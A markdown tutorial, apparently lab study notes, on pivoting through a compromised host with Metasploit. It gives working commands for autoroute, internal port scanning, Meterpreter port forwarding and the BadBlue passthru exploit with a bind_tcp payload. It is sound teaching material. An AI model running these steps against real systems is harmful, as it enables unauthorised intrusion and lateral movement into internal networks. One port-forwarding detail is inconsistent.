# Pivoting in Post-Exploitation

Pivoting is a **post-exploitation technique** used when you compromise one machine (Victim 1) that has access to other internal systems (Victim 2).  
Since Victim 2 is not directly accessible from outside, we pivot through Victim 1 to reach it.

---

## 📌 Concept
- Exploit **Victim 1** (publicly accessible) → gain Meterpreter session.  
- Use Victim 1 as a **bridge** to access **Victim 2** (internal-only).  

![Pivoting Diagram](https://drive.google.com/uc?id=1NrzD89ICajcoRexLKX9Lpg58mXuJw3KC)

---

## 🔥 Practical Walkthrough

###  Exploit Victim 1
Exploit a public service (e.g., Rejetto HFS) on Victim 1 to get a Meterpreter shell.

```bash
meterpreter > ipconfig
```



Check available interfaces and note the **internal subnet**.

---

###  Add a Route for Internal Network

```bash
meterpreter > run autoroute -s <ip_subnet_range/20>
```

* This tells Metasploit to route traffic for that subnet through Victim 1.
* ⚠️ Important: This only works for **Metasploit modules**. External tools like `nmap` won’t work with this route.

---

###  Scan Victim 2 from Metasploit

Use Metasploit’s TCP port scanner:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <victim2 IP>
run
```

Or directly with `db_nmap` via port forwarding (explained below).

---

###  Port Forwarding

If Victim 2 is only accessible internally, forward its port to your local machine:

```bash
meterpreter > portfwd add -l 1234 -p 80 -r <victim2 IP>
```

* `-l 1234` → Local port on your machine.
* `-p 80` → Remote port on Victim 2.
* `-r <victim2 IP>` → Target inside network.

Now you can interact with Victim 2 as if it were running on your localhost:

```bash
msf6 > db_nmap -sS -sV -p 1234 localhost
```

✅ Test in browser:

```
http://127.0.0.1:1234
```

---

### Exploit Victim 2

Victim 2 is running **BadBlue**. Use the BadBlue passthru exploit:

```bash
use exploit/windows/http/badblue_passthru
set RHOST <victim2 IP>
set RPORT 80   # forwarded port
set TARGET BadBlue EE 2.7
set PAYLOAD windows/meterpreter/bind_tcp
exploit
```

#### Why `bind_tcp` payload?

* Since Victim 2 is in the internal network and we forwarded its port, a **bind shell** makes Victim 2 listen for connections.
* Our attack machine connects to it via the forwarded port, bypassing the fact that Victim 2 is not directly reachable from outside.

---
